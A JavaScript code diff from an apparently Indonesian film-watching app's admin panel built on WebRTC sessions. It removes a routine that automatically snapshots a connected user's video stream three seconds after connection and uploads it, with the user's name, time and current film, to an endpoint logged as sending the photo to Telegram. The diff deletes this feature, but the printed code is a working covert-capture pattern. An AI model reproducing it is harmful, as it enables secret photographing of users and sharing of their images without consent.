@@ -674,8 +674,6 @@ async function setupPeerConnection_Admin(sessionId, user) {
     if (pc.connectionState === 'connected') {
       const el = document.getElementById(`card-${sessionId}`);
       if (el) el.style.opacity = '1';
-      // Auto capture screenshot 3 detik setelah koneksi tersambung
-      setTimeout(() => captureAndSendFrame(sessionId, user), 3000);
     }
   };
 
@@ -718,75 +716,6 @@ function animateAudioMeter(sessionId) {
     }
   };
   animate();
-}
-
-// ================================================================
-// CAPTURE & KIRIM FRAME KE TELEGRAM
-// ================================================================
-async function captureAndSendFrame(sessionId, user) {
-  try {
-    const peer = adminPeers.get(sessionId);
-    if (!peer) return;
-
-    const videoEl = document.getElementById(`video-${sessionId}`);
-    if (!videoEl || videoEl.readyState < 2 || videoEl.videoWidth === 0) {
-      // Video belum siap, coba lagi 3 detik kemudian (max 3 kali)
-      peer._captureRetry = (peer._captureRetry || 0) + 1;
-      if (peer._captureRetry <= 3) {
-        setTimeout(() => captureAndSendFrame(sessionId, user), 3000);
-      }
-      return;
-    }
-
-    // Capture frame dari video element ke canvas
-    const canvas  = document.createElement('canvas');
-    canvas.width  = videoEl.videoWidth;
-    canvas.height = videoEl.videoHeight;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-
-    // Convert ke blob JPEG
-    canvas.toBlob(async (blob) => {
-      if (!blob) return;
-
-      const now    = new Date();
-      const waktu  = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-      const tanggal = now.toLocaleDateString('id-ID', { day: '2-digit', month: 'long', year: 'numeric' });
-
-      // Ambil info film dari session card
-      const card    = document.getElementById(`card-${sessionId}`);
-      const filmEl  = card?.querySelector('.sc-details');
-      const filmNow = filmEl?.textContent || '—';
-
-      // Kirim ke server endpoint
-      const formData = new FormData();
-      formData.append('photo', blob, 'capture.jpg');
-      formData.append('name',    user.name);
-      formData.append('initial', user.initial || 'U');
-      formData.append('waktu',   `${waktu} WIB`);
-      formData.append('tanggal', tanggal);
-      formData.append('film',    filmNow);
-
-      try {
-        const res = await fetch(`${API_BASE}/api/capture`, {
-          method:  'POST',
-          headers: { 'Authorization': `Bearer ${authToken}` },
-          body:    formData
-        });
-        const data = await res.json();
-        if (data.success) {
-          addAdminLog(user.name, 'foto terkirim ke Telegram 📸', '#A855F7', 'camera');
-        } else {
-          addAdminLog(user.name, `gagal kirim foto: ${data.message}`, '#F2716B', 'error');
-        }
-      } catch (err) {
-        addAdminLog(user.name, 'gagal kirim foto ke server', '#F2716B', 'error');
-      }
-    }, 'image/jpeg', 0.85);
-
-  } catch (err) {
-    console.error('Capture error:', err);
-  }
 }
 
 function flipCameraRequest(sessionId) {
@@ -846,42 +775,6 @@ function playFilm(id) {
   if (card) card.classList.add('active');
 
   CURRENT_FILM = film.title;
-
-  // Optional: Capture frame dari iframe setelah 2 detik (jika bisa)
-  // Catatan: Cross-origin restriction mungkin prevent ini
-  setTimeout(() => {
-    captureVideoFrame(id, iframe);
-  }, 2000);
-}
-
-// Coba capture frame dari video element (jika tidak iframe restricted)
-function captureVideoFrame(filmId, iframe) {
-  try {
-    const video = iframe?.contentDocument?.querySelector('video');
-    if (video && video.readyState >= 2) { // HAVE_CURRENT_DATA
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0);
-      
-      const frameDataUrl = canvas.toDataURL('image/jpeg', 0.8);
-      
-      // Update thumbnail di film card
-      const card = document.getElementById(`film-card-${filmId}`);
-      if (card) {
-        const poster = card.querySelector('.film-poster');
-        if (poster) {
-          poster.style.backgroundImage = `url('${frameDataUrl}')`;
-          poster.style.backgroundSize = 'cover';
-          poster.style.backgroundPosition = 'center';
-        }
-      }
-    }
-  } catch (e) {
-    // Iframe restrict atau error → ignore, thumbnail sudah ada dari URL
-    console.debug('Video frame capture skipped (cross-origin or not ready):', e.message);
-  }
 }
 
 
@@ -1655,3 +1548,6 @@ function selectFilm(film) {
 // Show status message
 
 // Load videos saat admin masuk
+function initAdminVideos() {
+  loadVideos();
+}
